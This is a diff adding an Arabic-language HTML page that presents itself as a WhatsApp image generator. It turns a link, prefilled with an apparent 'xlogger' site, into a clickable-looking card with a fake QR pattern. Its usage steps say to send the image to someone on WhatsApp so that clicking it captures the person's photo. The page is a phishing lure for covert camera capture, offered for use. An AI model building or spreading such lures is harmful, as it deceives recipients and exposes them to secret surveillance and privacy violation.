@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>مولد صورة للواتس</title>
+  <style>
+    body { font-family: Arial; background: #f0f0f0; padding: 20px; text-align: center; }
+    .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
+    canvas { border: 2px solid #ddd; margin: 20px 0; max-width: 100%; }
+    button { background: #25d366; color: white; border: none; padding: 15px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; }
+    textarea { width: 100%; height: 80px; margin: 10px 0; padding: 10px; }
+    .code-box { background: #f5f5f5; padding: 15px; border-radius: 8px; margin: 15px 0; word-break: break-all; font-size: 12px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>مولد صورة للواتس آب</h2>
+    
+    <p>أدخل الرابط:</p>
+    <input type="text" id="urlInput" value="https://xlogger-main.vercel.app/image.html" title="Enter URL" placeholder="أدخل الرابط هنا..." style="width:100%;padding:10px;">
+    
+    <button onclick="generateImage()">إنشاء صورة</button>
+    
+    <canvas id="canvas" width="400" height="300"></canvas>
+    
+    <button onclick="downloadImage()">تحميل الصورة</button>
+    
+    <div style="margin-top:20px;text-align:right;background:#f9f9f9;padding:15px;border-radius:8px;">
+      <h4>طريقة الاستخدام:</h4>
+      <ol style="line-height:2;">
+        <li>أدخل الرابط</li>
+        <li>اضغط "إنشاء صورة"</li>
+        <li>اضغط "تحميل الصورة"</li>
+        <li>أرسل الصورة في الواتس آب</li>
+        <li>عندما ينقر الشخص ← يلتقط صورته!</li>
+      </ol>
+    </div>
+  </div>
+
+  <script>
+    function generateImage() {
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      const url = document.getElementById('urlInput').value;
+      
+      // Background
+      const gradient = ctx.createLinearGradient(0, 0, 400, 300);
+      gradient.addColorStop(0, '#667eea');
+      gradient.addColorStop(1, '#764ba2');
+      ctx.fillStyle = gradient;
+      ctx.fillRect(0, 0, 400, 300);
+      
+      // Border
+      ctx.strokeStyle = 'white';
+      ctx.lineWidth = 4;
+      ctx.strokeRect(10, 10, 380, 280);
+      
+      // Title
+      ctx.fillStyle = 'white';
+      ctx.font = 'bold 28px Arial';
+      ctx.textAlign = 'center';
+      ctx.fillText('📸 صورة مميزة', 200, 60);
+      
+      // Subtitle
+      ctx.font = '18px Arial';
+      ctx.fillText('انقر لعرض الصورة كاملة', 200, 100);
+      
+      // URL
+      ctx.font = '12px Arial';
+      ctx.fillStyle = '#f0f0f0';
+      
+      // Shorten URL for display
+      let displayUrl = url;
+      if (url.length > 40) {
+        displayUrl = url.substring(0, 37) + '...';
+      }
+      ctx.fillText(displayUrl, 200, 200);
+      
+      // QR Code placeholder (visual representation)
+      ctx.fillStyle = 'white';
+      ctx.fillRect(150, 100, 100, 100);
+      
+      // Draw QR pattern
+      ctx.fillStyle = 'black';
+      for(let i=0; i<10; i++) {
+        for(let j=0; j<10; j++) {
+          if ((i+j)%2 === 0) {
+            ctx.fillRect(155 + i*9, 105 + j*9, 8, 8);
+          }
+        }
+      }
+      
+      // Footer
+      ctx.fillStyle = 'white';
+      ctx.font = '14px Arial';
+      ctx.fillText('🔗 انقر هنا للفتح', 200, 250);
+    }
+    
+    function downloadImage() {
+      const canvas = document.getElementById('canvas');
+      const link = document.createElement('a');
+      link.download = 'whatsapp-image.png';
+      link.href = canvas.toDataURL('image/png');
+      link.click();
+    }
+    
+    // Generate on load
+    window.onload = generateImage;
+  </script>
+</body>
+</html>
